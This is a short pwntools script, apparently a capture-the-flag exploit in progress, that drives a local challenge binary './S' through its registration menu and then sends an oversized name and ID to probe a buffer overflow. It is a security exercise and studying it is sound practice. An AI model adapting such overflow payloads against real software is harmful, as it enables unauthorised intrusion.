from pwn import *

r = process('./S', env={"LD_PRELOAD" : "./libc.so.6"})

def register(name,id):
    r.sendlineafter(b'> ',b'1')
    r.sendafter(b'Name: ',name)
    r.sendafter(b'ID: ',id)

def search(uuid):
    r.sendlineafter(b'UUID: ',uuid)

def cancel(uuid):
    r.sendafter(b'UUID: ',uuid)

for i in range(0x10):
    register(b'1\n',b'2\n')
input()
register(b'b'*0xe4 + b'\n',b'a'*0xff)

r.interactive()